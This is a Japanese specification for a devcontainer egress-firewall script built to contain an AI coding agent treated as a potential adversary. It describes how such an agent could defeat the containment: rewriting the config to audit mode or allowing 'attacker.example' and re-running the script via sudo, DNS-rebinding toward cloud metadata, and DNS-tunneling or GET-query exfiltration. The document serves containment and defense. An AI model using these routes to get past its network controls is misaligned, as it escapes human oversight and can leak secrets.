# init-project-firewall.sh 仕様書

devcontainer 向け egress 制御スクリプトの仕様。**現在の実装の記述**です。

初版の設計方針は [`initial-spec.md`](./initial-spec.md) にあります。実装と実機検証（2026-08-02）を経て変わった点は §11 にまとめています。

関連文書:

* [`../README.md`](../README.md) — セットアップと運用
* [`known-issues.md`](./known-issues.md) — 既知の制限と未決事項
* [`verification-checklist.md`](./verification-checklist.md) — 実機検証手順と実施結果

---

## 1. 目的とスコープ

### 目的（守るもの）

1. **漏洩シンクの制限** — injection・暴走時に、コンテナ内の秘密・コードを書き出せる先を allowlist に限定する
2. **DNS 経路の固定** — 53 番宛を、コンテナに割り当てられたリゾルバのみに固定する。任意のネームサーバーへ直接投げる経路を塞ぎ、試行を記録する。**トンネリング本体は防げない**（許可されたリゾルバが再帰問い合わせをするため。§9.4）
3. **攻撃プラットフォーム化の防止** — default DROP により C2 通信・スキャンの踏み台化を防ぐ

### Non-goals（守らないもの・守れないもの）

* **悪性コンテンツの流入防止はしない。** allowlist に GitHub/npm がある時点で任意コンテンツは流入する。INPUT 側フィルタに実効性はなく、目的としない
* **完全な exfil 防止は保証しない。** 許可先への GET クエリ等による低帯域漏洩は残る。残余リスクは enclave-env 本来の役割（prod キー不在・least-privilege クレデンシャル）で受け止める
* **L7 制御（メソッド別・パス別の制御）はしない。** 将来の proxy 移行で扱う（§10）
* **IPv6 の allowlist は作らない。** 外向き IPv6 は全 DROP（§4.7）

### 設計原則

* 基底ポリシーはパッケージ（版管理・全プロジェクト共通）、プロジェクト差分は repo 内 `firewall.json`
* 冪等（何度実行しても同じ結果）
* **fail-closed の一貫性** — 「エラーだが全開で起動」する経路を持たない
* **リビルド中に外部ネットワークを必要としない** — ネットワークを閉じてから allowlist を構築する
* 将来 L7 proxy へ移行する際、本スクリプトが「proxy 宛のみ許可」へ縮小できる構造にする

---

## 2. 構成要素

| 要素 | 置き場所 | 役割 |
|---|---|---|
| `init-project-firewall.sh` | パッケージ内 → イメージビルド時に `/usr/local/bin/` へ root がコピー | ルール適用本体 |
| `firewall.json`（ソース） | プロジェクト repo（`.devcontainer/firewall.json`） | プロジェクト固有の追加許可。**それ自体は効力を持たない** |
| `firewall.json`（実効） | イメージビルド時に `/etc/egress-guard/firewall.json` へ root がコピー | 適用時に読まれる唯一の設定 |
| 基底プロファイル | **スクリプトに埋め込み** | 全プロジェクト共通の allowlist |
| `templates/*.json` | パッケージ内 | `firewall.json` の雛形 |
| Dockerfile ボイラープレート | 各プロジェクト | NET_ADMIN/NET_RAW cap、sudoers 行、配置 |

基底プロファイルをスクリプトに埋め込むのは意図的です。同梱 JSON にすると `node_modules` 内に置かれ、非特権ユーザーが書き換えられる = 権限昇格経路になります。

### 2.1 権限モデル（最重要設計点）

**sudoers が `node_modules` 内のパスを指してはならない。** そこを sudo 対象にすると「agent がスクリプト本体を書き換えて root 実行」という権限昇格経路になります。

正しい流れ:

1. **イメージビルド時**（root）に `/usr/local/bin/init-project-firewall.sh` へ**コピー**し、`root:root` 所有・`755`
2. sudoers は固定パスかつ**引数なし**のみ許可
3. `postStartCommand` で `sudo /usr/local/bin/init-project-firewall.sh` を実行

`postCreateCommand` は既定で `remoteUser`（= `node`）として実行されるため、配置には使えません。

#### sudoers の書き方

```
node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""
```

**末尾の `""` は必須です。** sudoers の仕様では、Cmnd に引数を書かないと「任意の引数で実行してよい」という意味になります。空の引数リスト `""` を明示して初めて「引数なしのみ」になります。

スクリプト側にも多重防御があります。`SUDO_USER` / `SUDO_UID` が設定された状態で引数が渡された場合、開発用オプション（§8）を拒否します。

#### immutable 属性について

`chattr +i` は**使いません**。`CAP_LINUX_IMMUTABLE` が Docker のデフォルト capability セットに含まれず、`docker build` の `RUN` であっても失敗します。加えて、`chattr +i` が守るのは「root を取った攻撃者による書き換え」ですが、root を取られた時点で `chattr -i` も実行できるため防御価値は限定的です。

成立している防御は次の 2 点です。

* ファイルが `root:root` 所有・`755`・`/usr/local/bin` 配下にあり、`node` に書き込み権限がない
* `node` に許可された sudo が当該スクリプトの引数なし実行のみで、`chattr` も `cp` も実行できない

#### 実効設定が root 所有でなければならない理由

**この脅威モデルにおける敵はコンテナ内のエージェント自身であり、そのエージェントは sudoers によりいつでも再適用を実行できます。**

再適用が読むファイルをエージェントが書き換えられるなら、root を取らずに 2 手でポリシー全体が無効になります。

1. `firewall.json` に `{"mode": "audit"}` または `{"allowDomains": ["attacker.example"]}` と書く（構文的に正当なため §3.2 のバリデーションはすべて通ります）
2. `sudo /usr/local/bin/init-project-firewall.sh` を実行する

したがって**適用時に読まれる設定は `/etc/egress-guard/firewall.json` のみ**とし、repo 側のコピーは探索対象から外します。repo 側は「ソース」であり、イメージ再ビルドで実効設定になります。

この分離により、次の 2 つが別の操作になります。

| 操作 | 実行者 | 必要な手順 |
|---|---|---|
| 再解決（CDN の IP 変動への追随） | エージェントで可 | 再適用のみ |
| ポリシー変更 | 人間 | repo の編集 + イメージ再ビルド |

CDN 対策としての「エージェント自身による再適用」は維持されます。失われるのは audit モードでの試行錯誤の即時性だけで、audit の収集フェーズは人間が回すものであるため許容します。

スクリプトは適用時に次を確認します。違反はすべて exit≠0（panic）です。

* **スクリプト自身**が root 所有かつグループ・その他から書き込み不可であること（`SUDO_USER` / `SUDO_UID` がある場合のみ。sudoers が `node_modules` 内を指す誤設定を捕まえる）
* `/etc/egress-guard/firewall.json` が root 所有・書き込み不可・symlink でないこと
* 親ディレクトリ `/etc/egress-guard` が root 所有・書き込み不可であること

**これらが捕まえるのは設定ミスです。** 悪意をもって差し替えられたスクリプトに対しては意味を持ちません（差し替えた側が検証コードごと削除できるため）。利用者に手動確認を求めない代わりの仕組みであり、攻撃者に対する防御ではありません（[known-issues](./known-issues.md) 項目 14）。

**内容そのものは依然として攻撃者制御データとして扱います**（§3.2）。root 所有であることは「誰が書き換えられるか」を制約するだけで、repo に入る値の正当性を保証しないためです。

---

## 3. firewall.json

### 3.1 設定の所在とスキーマ

**読むのは `/etc/egress-guard/firewall.json` だけです。探索は一切行いません。** 見つからない場合は基底プロファイルのみで動作します。理由は §2.1。

設定は**イメージビルドが配置するもの**であり、スクリプトが見つけ出すものではありません。探索を持たない理由は 2 つあります。

1. **構成非依存** — ワークスペースのマウント先は環境で変わります（`/workspace`、標準の devcontainer は `/workspaces/<name>`、それ以外）。特定のレイアウトを前提にした実装にしません
2. **攻撃面** — スクリプトが「見に行く場所」を増やすほど、エージェントがポリシーを置ける候補地が増えます

まだインストールされていないファイルを検証する場合は `--config` でパスを明示します（§8）。

```sh
# 再ビルド前に repo 側のコピーを検証する
init-project-firewall.sh --check-config --config .devcontainer/firewall.json
```

パスは環境変数からも導出しません（sudo 下の環境変数は信用できないため）。

```json
{
  "version": 1,
  "profile": "default",
  "mode": "enforce",
  "allowDomains": ["registry.example.com"],
  "allowCidrs": ["203.0.113.0/24"],
  "allowHostPorts": [5432],
  "sshdPort": 22
}
```

| フィールド | 型 | 必須 | 説明 |
|---|---|---|---|
| `version` | int | ✔ | スキーマ版。現在は `1` のみ。未知の版は **fail-closed で拒否** |
| `profile` | string | — | 基底プロファイル名。現在は `default` のみ |
| `mode` | `"enforce"` \| `"audit"` | — | 既定 `enforce`。§6 参照 |
| `allowDomains` | string[] | — | 追加許可ドメイン。**ワイルドカードは使用不可**（§9.1）。具体的なホスト名を列挙する |
| `allowCidrs` | string[] | — | 追加許可 CIDR |
| `allowHostPorts` | int[] | — | ホスト宛に許可する TCP ポート（§4.8） |
| `sshdPort` | int | — | コンテナ内 sshd のポート。既定 `22`（§4.9） |

ファイルサイズの上限は 64 KiB です。JSON にコメントは書けません（`jq` でパースするため）。

### 3.2 バリデーション

root スクリプト側で実施し、違反は **panic テーブルを適用して exit≠0**（§4.6）。

* JSON として不正 → 拒否
* トップレベルがオブジェクトでない → 拒否
* **未知のトップレベルキー → 拒否**（タイプミスが黙って無視されるのを防ぐ）
* 各フィールドの型不一致、非整数の数値 → 拒否
* `version` が既知の版でない → 拒否
* `profile` が既知の名前でない → 拒否

#### ドメイン

* 文字種は `[a-zA-Z0-9.-]` に限定（シェル展開・ipset コマンドに渡る前に遮断）
* 長さ 253 文字以下
* **`*` を含むものは全て拒否**（`*.example.com`、`*`、`*.*`、`*.com`、`example.*`）。理由は §9.1。拒否時は「何を書けばよいか」を含むメッセージを出す
* ホスト名として妥当な形（先頭・末尾のハイフン、連続ドットを拒否）

#### CIDR

* IPv4 の `A.B.C.D/len` 形式のみ
* **先頭ゼロを拒否**（`010.0.0.1` は bash の算術で 8 進数と解釈されるため）
* プレフィックス長は 8〜32
* 以下の範囲と**重複する**ものを拒否。前方一致ではなく**数値レンジの重複判定**を行うため、`100.0.0.0/8` のような包含するスーパーネットも弾かれます

| 範囲 | 理由 |
|---|---|
| `0.0.0.0/8` | 予約 |
| `10.0.0.0/8` | RFC1918 |
| `100.64.0.0/10` | **CGNAT。Tailscale 網への横移動対策** |
| `127.0.0.0/8` | loopback |
| `169.254.0.0/16` | link-local（クラウドのメタデータサービスを含む） |
| `172.16.0.0/12` | RFC1918 |
| `192.168.0.0/16` | RFC1918 |
| `224.0.0.0/4` | multicast |
| `240.0.0.0/4` | 予約 |

`0.0.0.0/0` と `::/0` はプレフィックス長の検査で弾かれます。

#### ポート

1〜65535 の整数。先頭ゼロを拒否。

---

## 4. スクリプト仕様

### 4.1 前提・実行環境

* bash、`set -euo pipefail`、`IFS=$'\n\t'`
* 必須コマンド: `iptables` `iptables-restore` `ipset` `jq` `curl` `dig` `ip`
* 任意: `aggregate`（GitHub CIDR の集約。無ければ警告のみ）
* root で実行されていなければ即 exit
* `/etc/resolv.conf` に IPv4 の `nameserver` が 1 つ以上あること（§4.3）

### 4.2 処理順序

```
1. root / 必須コマンド の確認          ← 失敗 = ルール未適用のまま exit≠0
   --- ここから適用フェーズ（失敗は panic テーブル + exit≠0）---
2. firewall.json の所在確認・所有者検証・読込・スキーマ検証
3. リゾルバ / IPv6 制御可否の確認
4. デフォルトゲートウェイの検出
5. ipset の準備（live を -exist で確保、staging を作り直し、audit set を -exist で確保）
6. ネットワークを閉じる
     a. IPv6 最終テーブルを適用（全 DROP）。以降 再オープンしない
     b. IPv4 bootstrap テーブルを適用（policy DROP）
7. allowlist を構築（DNS のみ。staging ipset に投入）
8. ホスト宛アドレスの解決（host.docker.internal。§4.8）
9. ipset swap で allowlist を差し替え、IPv4 最終テーブルを適用
10. GitHub meta API から CIDR を取得して live set に追加（best effort）
11. 自己検証                            ← 失敗 = panic テーブル + exit≠0
```

**適用フェーズは設定を読む前に始まります。** 1 で `iptables` の存在を確認した時点で panic テーブルを適用できるようになるため、そこから先はどの失敗も閉じた状態で終わります。設定エラーを例外にしない理由は §4.6 を参照してください。

**6 を 7 より先に行うのが本仕様の核です。** リビルド中に外部ネットワークを必要とする工程が存在しないため、途中で強制終了されても「開いたまま固定される」状態になりません。

8 が 6 の後にあるのは、`host.docker.internal` の解決に `/etc/hosts`（デフォルトブリッジ）または埋め込みリゾルバ（ユーザー定義ネットワーク）を使うためです。どちらも bootstrap テーブルの下で利用できます。

10 を 9 の後に置いているのは、`api.github.com` に到達できるのが最終テーブル適用後だからです。GitHub の主要ホストは 7 の DNS 解決で既に許可されているため、10 が失敗しても GitHub は使えます。

### 4.3 DNS の扱い

**リゾルバは `/etc/resolv.conf` から検出します。** `127.0.0.11`（Docker 埋め込みリゾルバ）はユーザー定義ネットワーク上でのみ提供され、デフォルトブリッジ上のコンテナにはホスト側の DNS アドレスが直接書かれます。決め打ちでは動きません。

* `nameserver` 行の IPv4 アドレスをすべて収集する
* 収集したアドレス宛の UDP/TCP 53 のみ ACCEPT、それ以外の 53 番宛は DROP
* IPv4 のリゾルバが 1 つも無い場合は **exit≠0**（DNS を開放するとトンネリングでポリシー全体が無意味になるため）
* `127.0.0.11` 以外だった場合は警告を出す（ユーザー定義ネットワークのほうが強い構成である旨）

`resolv.conf` は root 所有で Docker が書き込むため、非特権ユーザーがリゾルバを差し替えることはできません。収集したアドレスは iptables に渡る前に IPv4 として検証します。

#### ルール順序

DNS の DROP ルールは**汎用の `ESTABLISHED,RELATED` ACCEPT より前**に置きます。後ろに置くと、スクリプト適用前に確立された外部 DNS のフロー（UDP の conntrack エントリ、TCP/53 接続）が生き残り、トンネリングを継続できてしまいます。

### 4.4 ルールの適用方式

**各アドレスファミリのフィルタテーブルを `iptables-restore` の単一トランザクションで置き換えます。** chain policy も同じ入力に含めます。

* チェーンが空のまま policy が ACCEPT になる中間状態が存在しない
* SIGKILL を受けても、旧テーブルか新テーブルのどちらかしか観測されない
* **nat テーブルには触りません。** Docker の DNS DNAT はそこにあり、非特権ユーザーは書き込めないため、退避・復元は不要な複雑性です

IPv4 と IPv6 は 1 つのトランザクションを共有できません。そのため IPv6 を先に最終状態へ確定させ、以降は触らない構成にしています。

### 4.5 allowlist の構築

* live set（`egress-allow-v4`）はルールから名前で参照されるだけ。中身は staging set（`egress-allow-v4-stg`）で組み立て、`ipset swap` でアトミックに差し替える
* swap の時点で live なのは bootstrap テーブルであり、そのテーブルは set を参照しません。したがって**部分的に構築された allowlist を参照するルールは存在しません**
* staging は毎回作り直すため、前回の内容に依存しません（冪等性の根拠）
* 基底プロファイルのドメイン、GitHub の主要ホスト、`firewall.json` のドメインを DNS で解決して投入
* `firewall.json` の CIDR をそのまま投入
* 最終テーブル適用後に GitHub meta API の CIDR を live set へ追加

#### DNS 応答のアドレス検査

**名前解決で得た IP も禁止レンジ（§3.2 の表）に照らします。** 該当するアドレスは警告して allowlist に入れません。

これが無いと `allowCidrs` の検査を DNS 経由で迂回できます。許可済みドメインのゾーンが攻撃者制御下にある、あるいは汚染された場合、`169.254.169.254`（クラウドのメタデータサービス）や RFC1918 アドレスを返すだけで allowlist に載ります。**エージェントは再適用の実行時刻を選べる**ため、DNS rebinding のタイミングも狙えます。

`host.docker.internal` だけは私設アドレスを返すのが正常なため、この検査を通しません。代わりに §4.8 の専用検査を使います。

解決結果が禁止レンジのアドレスしか無い場合は「解決できなかった」と同じ扱い（警告して継続）にします。自己検証も同じ基準で対象アドレスを選ぶため、この状態が panic になることはありません。

#### 名前解決の失敗ハンドリング

* **個別ドメインの解決失敗 = warn して continue。** そのドメインが通らないだけで、起動不能にはしません
* ただし基底プロファイルの必須ドメイン（`api.anthropic.com`）が 1 つも解決できない場合は、ネットワーク自体の異常なので exit≠0

#### ワイルドカードの扱い

**受理しません。** `*` を含む `allowDomains` エントリはバリデーション段階で拒否します（§3.2）。理由は §9.1。

### 4.6 失敗時の挙動

| 失敗した段階 | 結果 |
|---|---|
| 引数の解釈、`--check-config` | **ルール未適用**のまま exit≠0 |
| root 確認・必須コマンド確認（§4.2 の 1） | 同上。`iptables` が無い状態では panic テーブルすら適用できないため |
| 設定の所在・所有者・スキーマ（同 3〜4） | **panic テーブル**を適用して exit≠0 |
| リゾルバ・IPv6 制御の確認（同 5） | 同上 |
| 適用フェーズ（同 6 以降） | 同上 |

**設定エラーでも panic に倒します。** 以前は「設定の誤りで、既に入っているルールを乱すべきではない」という理由でルール未適用のまま終了していました。しかしその理屈が成り立つのは再適用時だけです。**初回起動時の「直前のポリシー」は既定の全 ACCEPT** であり、そこで何も適用せずに終了すると、コンテナは開いたまま残ります。このスクリプトが防ごうとしている状態そのものです。

タイプミスの検出は `--check-config`（§8）で行ってください。再ビルド前に気付けます。

panic テーブル:

```
:INPUT DROP / :FORWARD DROP / :OUTPUT DROP
-A INPUT  -i lo -j ACCEPT
-A OUTPUT -o lo -j ACCEPT
-A INPUT  -p tcp --dport <sshdPort> -j ACCEPT
-A OUTPUT -p tcp --sport <sshdPort> -m conntrack --ctstate ESTABLISHED -j ACCEPT
```

**OUTPUT の汎用 ESTABLISHED は含めません。** 含めると、失敗前に確立された exfil 接続が動き続けます。残すのは loopback と、確立済み inbound sshd セッションの応答だけです。`docker exec` による接続はネットワークスタックを経由しないため、対話アクセスは維持されます。

SIGKILL では trap が発火しません。それでも「開いたまま」が残らないのは §4.4 の適用方式と §4.2 の順序によるものです。ただし**スクリプトが最初の `iptables-restore` に到達する前に殺された場合**は何も変更されず、直前の状態が残ります。これは「エラーだが全開で起動」ではなく「スクリプトが走らなかった」状態で、`postStartCommand` の失敗としてコンテナ起動側に伝わります。

### 4.7 IPv6

**外向き IPv6 は allowlist を持たず全 DROP です。** loopback（`::1`）のみ通します。

理由:

1. **IPv4 だけ締めると allowlist が無意味になる。** 宛先アドレス選択（RFC 6724）は AAAA を優先するため、IPv6 経路が開いていれば allowlist を素通りできる
2. **allowlist を IPv6 にも作るのは割に合わない。** ipset の二重化、AAAA 解決、GitHub meta の v6 レンジ処理、自己検証の二重化が必要になる一方、セキュリティ上の利得はない
3. **閉じても壊れない。** Docker は既定で IPv6 を有効化しないため、コンテナに global IPv6 アドレスは付かない
4. **開けるリスクと閉じるコストが非対称**

audit モードでも DROP のままです。試行は `fw-drop6:` のログに残ります。

#### ip6tables が使えない場合

「`ip6tables` が無い = IPv6 が無い」という推論は成り立ちません（バイナリ未導入、nft backend の不整合でもスタックは生きます）。判定は次のとおりです。

| 状態 | 挙動 |
|---|---|
| `ip6tables` が使える | 制御する |
| 使えない、かつ `/proc/net/if_inet6` が非空（スタック生存）| **exit≠0**（素通りを許さない） |
| 使えない、かつ IPv6 スタックが無い | warn してスキップ |

### 4.8 ホストゲートウェイの扱い

ホストには Tailscale 網が繋がっている可能性があるため、**既定は不許可**です。必要なポート（ローカル DB 等）だけを `allowHostPorts` で開けます。

許可されるのは**ホストを指すアドレス宛の指定 TCP ポートのみ**で、ホストのサブネット全体ではありません。

許可対象は次の 2 つです。

1. デフォルトゲートウェイの IP（`ip route show default`）
2. `host.docker.internal` の解決結果（重複は除外）

**Docker Desktop ではこの 2 つが別アドレスになることがあり**、ゲートウェイのみを許可するとホスト上のローカル DB へ到達できません。両方を対象にするのはそのためです。

`host.docker.internal` の解決結果は、**私設アドレス（RFC1918 / CGNAT / link-local）であることを確認**します。公開アドレスが返るのは名前が横取りされた場合であり、そこにポートを開けば「ホスト宛の許可」ではなく任意のインターネットホストへの穴になります。該当しないアドレスは警告して使いません。

いずれか一方しか取得できない場合は取得できたほうだけを許可し、警告を出します。`allowHostPorts` が指定されているのに**どちらも取得できない**場合は、要求された許可を黙って落とさず exit≠0 とします。

### 4.9 INPUT 側

default DROP + loopback + `ESTABLISHED,RELATED` + sshd ポートの NEW を許可。sshd のポートは `firewall.json` の `sshdPort` で上書きできます（既定 22）。

### 4.10 遮断先の記録

**遮断された宛先 IP を ipset `egress-audit-v4` に蓄積します。**

```
-A OUTPUT -m set --match-set egress-allow-v4 dst -j ACCEPT
-A OUTPUT -j SET --add-set egress-audit-v4 dst --exist    ← non-terminating
-A OUTPUT -m limit ... -j LOG --log-prefix "fw-drop: "
-A OUTPUT -j REJECT --reject-with icmp-admin-prohibited
```

**DNS の DROP は allowlist より前段にあるため、専用の記録ルールを別に置きます。**

```
-A OUTPUT -d <resolver>/32 -p udp --dport 53 -j ACCEPT
-A OUTPUT -p udp --dport 53 -j SET --add-set egress-audit-v4 dst --exist    ← non-terminating
-A OUTPUT -p udp --dport 53 -m limit ... -j LOG --log-prefix "fw-dns-drop: "
-A OUTPUT -p udp --dport 53 -j DROP
```

これが無いと**外部ネームサーバーへの試行（＝トンネリング試行）がどこにも残りません**。カーネルログが読めない環境が多い以上、最も見たいシグナルが最も見えない状態になります。リゾルバ宛の ACCEPT より後にあるため、正規の問い合わせは記録されません。

bootstrap テーブルにはこの記録ルールを入れません。`SET` ターゲットは任意のカーネルモジュールに依存し、最終テーブルにはフォールバック（後述）がある一方で bootstrap の失敗は致命的だからです。

* allowlist の ACCEPT より後にあるため、**許可済みの宛先は記録されません**
* `enforce` / `audit` の両モードで記録します
* `hash:ip timeout 604800`（7 日で自動失効）
* **スクリプトを再実行しても作り直しません**（蓄積が目的）
* `SET` ターゲットが使えないカーネルでは、記録ルールを外した構成に**自動でフォールバック**します（警告を出します）

記録されるのは IP のみです。時刻・ポート・プロトコルは残りません。

#### カーネルログ（`LOG`）について

`fw-drop:` / `fw-audit:` / `fw-dns-drop:` / `fw-drop6:` の `LOG` ルールも入っていますが、**多くの環境では出力されません**。

* コンテナ内の `dmesg` は `CAP_SYSLOG` が無いため読めない
* `net.netfilter.nf_log_all_netns` が既定の `0` の場合、カーネルが非初期ネットワーク名前空間からのログを抑制する

**運用の前提にしません。** 出力される環境では時刻とポートも取れるため残してあります。詳細は [`known-issues.md`](./known-issues.md) の項目 4。

### 4.11 冪等性

* 2 回連続実行 → 同一のルールセット・exit 0
* 3 回以上繰り返しても壊れない
* 実行途中で kill → 再実行で正常状態に収束
* live set の内容も収束する（staging を毎回作り直し、meta レンジを毎回追加するため）
* `egress-audit-v4` だけは蓄積が目的のため作り直しません

ルールセットの比較時は、`iptables-save` が付けるタイムスタンプのコメント行とパケットカウンタを除外してください。また `iptables -S` は `--ctstate` を正規化して表示します（`ESTABLISHED,RELATED` → `RELATED,ESTABLISHED`）。

---

## 5. 自己検証

スクリプト末尾で必ず実行します。いずれか失敗で panic テーブル + exit≠0。

| テスト | 期待 | スキップ条件 |
|---|---|---|
| 割り当てられたリゾルバで A レコードが返る | 成功 | — |
| 外部 DNS（`dig @<probe>`）が応答を返さない | 失敗 | 全プローブが設定済みリゾルバと一致 |
| 許可先（`api.anthropic.com`）に到達できる | 成功 | — |
| 未許可先に到達できない | 失敗 | audit モード / 全プローブが allowlist 内 |
| `firewall.json` のドメインが allowlist に載っている | 成功 | ドメイン未設定 / 1 つも解決できない |
| `firewall.json` の CIDR が allowlist に載っている | 成功 | CIDR 未設定 |
| IPv6 で外部に到達できない | 失敗 | global IPv6 アドレスが無い |

### 5.1 プローブの選び方

**プローブは、実際に対象外であることを確認してから選びます。** ハードコードすると、プロジェクトがそれを許可した瞬間に「正しい設定なのに自己検証が壊れる」状態になります。

* 外部 DNS のプローブ — `8.8.8.8` → `1.1.1.1` → `9.9.9.9` の順に試し、**設定済みリゾルバでない**ものを選ぶ
* 未許可先のプローブ — `example.com` → `example.net` → `example.org` の順に試し、解決した IP が**すべて allowlist 外**であるものを選ぶ

どれも使えない場合は警告付きでスキップします（検証を「成功」にはしません）。

### 5.2 判定の精度

`dig` は NXDOMAIN や SERVFAIL でも exit 0 を返すため、終了コードだけでは判定しません。**IPv4 形式の回答が実際に返ったか**で判定します。

`firewall.json` のドメイン検証は接続ではなく `ipset test` で行います。データベース等の非 HTTP サービスが多く、到達性テストが成立しないためです。

**判定は「再解決した IP のうち**いずれか**が allowlist に載っていれば成功」とします。** 大規模 CDN は DNS ラウンドロビンで問い合わせのたびに異なる部分集合を返すため、「最初の 1 IP」で判定すると、構築時と検証時で返る A レコード集合がずれた瞬間に、正しいポリシーがランダムに検証失敗します。自己検証の失敗は panic + exit≠0、すなわちコンテナの起動失敗です。fail-closed 側に倒れるとはいえ、正しい設定で起動が不安定になるのは運用上の欠陥です。

---

## 6. モードと運用

### 6.1 enforce（既定）

allowlist 外の外向き通信を REJECT します（`icmp-admin-prohibited`）。遮断先は `egress-audit-v4` に記録されます。

### 6.2 audit

新規プロジェクトの立ち上げ用です。allowlist 外の IPv4 外向き通信を**遮断せず**、記録だけ残します。数日運用して必要な宛先を収集し、`firewall.json` に転記してから `enforce` へ切り替える流れを想定しています。静的 allowlist の「事前に全部知らないと使えない」問題への緩和策です。

**audit でも遮断されるもの:**

* **DNS 固定** — 割り当てられたリゾルバ以外への 53 番宛は DROP。正規のトラフィックはそのリゾルバ経由なので実害はなく、ここを緩めるとポリシー全体が無意味になります
* **IPv6** — 全 DROP のまま
* **INPUT** — DROP のまま

audit が緩めるのは IPv4 の外向き通信だけです。

### 6.3 遮断先の調査

```sh
ipset list egress-audit-v4
```

記録されるのは IP のみなので、ホスト名は自分で引きます。逆引きは CDN や link-local では空振りすることが多いため、TLS 証明書の SAN を見るほうが確実です。

```sh
echo | openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -ext subjectAltName
```

`169.254.169.254`（クラウドのメタデータサービス）のような link-local アドレスは `firewall.json` では許可できません（§3.2）。遮断されているのが正しい状態です。

### 6.4 再適用

allowlist は起動時の名前解決に基づくため、CDN の IP 変動で許可先に到達できなくなることがあります。

```sh
sudo /usr/local/bin/init-project-firewall.sh
```

sudoers 上、agent 自身も再実行できますが、読むのは検証済みの `firewall.json` だけなので昇格には使えません。

### 6.5 パッケージの更新

パッケージ更新 → コンテナ rebuild で `/usr/local/bin` のコピーが更新されます。伝播はこの 1 経路のみです。

---

## 7. セキュリティ注意点（レビュー観点）

1. **権限昇格経路の遮断** — sudoers は `/usr/local/bin` の root 所有コピーのみを、**引数なし**（末尾 `""`）で指すこと。`node_modules` 内パスは不可（§2.1）
2. **実効設定は root 所有の `/etc/egress-guard/firewall.json` のみ**（§2.1）。エージェントは再適用を実行できるため、エージェントが書けるファイルを適用経路に入れてはならない。repo 側のコピーは再ビルドで反映されるソースであり、受託案件では PR レビュー必須ファイルとして扱う。内容そのものは攻撃者制御データとして検証する（§3.2）
3. **文字列の取り扱い** — `firewall.json` 由来の値を検証前にシェル・iptables/ipset に渡さない
4. **サプライチェーン** — スクリプトは root で動く。プライベートレジストリ＋lockfile 固定を維持する。配置時のチェックサム検証は未実装（[known-issues](./known-issues.md) 項目 8）
5. **DNS を全開放にしない** — 割り当てられたリゾルバへの固定が本仕様の核。緩めるとトンネリングで全体が無意味化する
6. **IPv6 を忘れない**（§4.7）
7. **fail-closed の一貫性** — 適用フェーズに入って以降のあらゆる失敗（設定エラーを含む）は panic + exit≠0。ルール未適用で終わってよいのは、`iptables` が使えると確認する前だけ。「エラーだが全開で起動」は作らない（§4.6）
8. **既知の残余リスク（受容するもの）** — 許可ドメインへの GET クエリ経由の低帯域 exfil／書き込み権限を持つ GitHub トークンがあれば github.com 経由の exfil は可能。対策は egress ではなくクレデンシャル側

### 7.1 実装上の落とし穴（回帰させないこと）

実機検証で顕在化した、再発しやすい欠陥です。

* **`IFS=$'\n\t'` の下で `"$*"` を使わない。** 改行で連結され、1 行のルールが複数行に割れます。空白連結が必要な箇所では `local IFS=' '` を使ってください
* **パイプの下流で早期終了しない。** `head -n1` / `grep -q` / `awk '...; exit'` は上流を SIGPIPE で殺し、`set -o pipefail` + `set -e` の下ではスクリプト全体が落ちます。出力をいったん変数に受けてから処理してください
* **自己検証のプローブをハードコードしない**（§5.1）
* **自己検証を「最初の 1 IP」で判定しない**（§5.2）。DNS ラウンドロビンで起動がランダムに失敗します
* **DNS 応答を検証済みデータとして扱わない**（§4.5）。`allowCidrs` にある検査は、名前解決の結果にも要ります
* **`assert_config_is_root_owned` は競合には勝てない。** ファイルは stat と jq で複数回開き直されるため、検査と読み取りの間に差し替えられれば通ります。bash で fd を保持し続けることができないためで、**防いでいるのは誤設定（ワークスペースのファイルを bind mount で被せる等）であって、競合する攻撃者ではありません**。親ディレクトリの所有者・権限と symlink は検査しています
* **外部コマンドに渡す前にアドレスファミリで絞る。** GitHub meta API は IPv6 プレフィックスも返します。`aggregate` の挙動はビルドによって異なるため、渡す前に IPv4 だけにしてください

---

## 8. 開発用オプション

```
--check-config           設定を検証して終了（ルールに触れない）
--config <path>          固定のパスではなくこのファイルを読む
--resolv-conf <path>     /etc/resolv.conf ではなくこのファイルからリゾルバを読む
```

`--check-config` を単体で使うとインストール済みの設定（`/etc/egress-guard/firewall.json`）を検証します。`--config` と組み合わせると、再ビルドで配置される前の repo 側コピーを検証できます。**この 2 つは設定の所在を変えません**（§3.1）。

`--check-config` を残している理由:

* **バリデータの end-to-end テストがこの経路にしかない。** `validate_domain` 等は source して直接呼べますが、未知フィールドの拒否・version 不一致・拒否メッセージの内容は `read_config` を通さないと検証できません
* **設定の反映に再ビルドが要るため、事前検証の価値が高い**（§2.1）。typo の代償が「再ビルド → 起動失敗 → 修正 → 再ビルド」になります。`jq . firewall.json` では JSON 構文しか見ず、スキーマ・CIDR・ドメインの検証は通りません

いずれも開発・テスト専用です。**`SUDO_USER` / `SUDO_UID` が設定された状態で引数が渡された場合は拒否します。** sudoers が正しく書かれていれば、そもそも sudo 経由では到達しません。

`--config` で明示指定した場合は所有者検証を行いません（sudo 経由では到達できない開発用の抜け道であり、インストール前のファイルを検証する際の障害にしないため）。

---

## 9. 既知の制限と未決事項

詳細は [`known-issues.md`](./known-issues.md)。ここでは仕様に影響するものだけ挙げます。

### 9.1 ワイルドカードは使用不可（**決定済み: v1 では拒否**）

本スクリプトはドメイン名を**起動時に IP へ解決して ipset に載せます。** パケットを見る時点でドメイン名は存在せず、宛先 IP しかありません。そして DNS には「あるゾーンのサブドメインを列挙する」手段がないため、`*.example.com` を IP の集合へ展開することは原理的にできません。

**決定: `*` を含む `allowDomains` エントリはバリデーションで拒否する。**

受理して apex だけ解決する案（旧実装）は採りません。**セキュリティ設定において「受理するが実現しない」のは最悪の性質**だからです。設定を書いた人は「サブドメイン全体が許可された」と信じ、実際には `api.example.com` も `db.example.com` も遮断されます。警告ではこの誤認を防げません。

拒否メッセージには回避策を含めます。

```
rejected allowDomains entry: *.example.com - wildcards are not supported. DNS cannot
enumerate the subdomains of a zone, so a wildcard cannot be expanded into addresses.
List the host names you need instead; run in audit mode and read ipset egress-audit-v4
to find out which ones those are.
```

L7 proxy（§10）への移行時にスキーマ version 2 で再導入します。proxy であればパケットにドメイン名（SNI / Host ヘッダ）が乗るため、展開せずにマッチできます。

初版仕様が例示に `*.neon.tech` を使っていたのは実装能力を超えた記述であり、仕様側の誤りでした。

### 9.2 「GET を全ドメイン許可」はできない（**決定済み: 拒否**）

